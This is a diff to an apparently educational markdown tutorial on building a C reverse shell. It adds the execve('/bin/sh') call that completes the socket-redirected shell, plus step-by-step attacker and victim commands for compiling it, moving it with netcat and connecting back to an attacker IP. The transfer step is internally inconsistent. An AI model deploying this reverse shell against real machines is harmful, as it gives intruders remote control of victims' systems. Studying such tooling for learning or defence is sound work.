@@ -76,6 +76,11 @@ int main () {
 		// dup2(sockfd, 2) - stderr
 		dup2(sockfd, i);
 	}
+	
+	//execve syscall
+	execve("/bin/sh", NULL, NULL);
+	
+	return 0;
 }
 ```
 
@@ -614,7 +619,7 @@ for (int i = 0; i < 3; i++){
 
 ##### 🔧 File Descriptors (FDs)
 
-In UNIX-like systems, every file, socket, or device is represented by an integer — a **file descriptor**.
+In UNIX-like systems, every file, socket, or device is represented by an integer - a **file descriptor**.
 
 Standard ones are:
 
@@ -699,3 +704,13 @@ execve("/bin/sh", NULL, NULL);
     ```
 	The shell’s **input/output/error** go through the **network socket**!
 ---
+### Run Command
+
+**Attacker's Machine** : Create `shell.c`- paste the above code and replace your attacker's ip with 192.168.0.108 in 8ᵗʰ line.
+**Attacker's Machine** : `gcc -o shell shell.c -w`
+**Victim's Machine** : `nc -lvnp 4444 > shell`
+**Attacker's Machine** : `nc -lvnp 4444`
+**Victim's Machine** : `chmod +x shell`
+**Victim's Machine** : `./shell`
+
+![[images/Pasted image 20250425161105.png]]
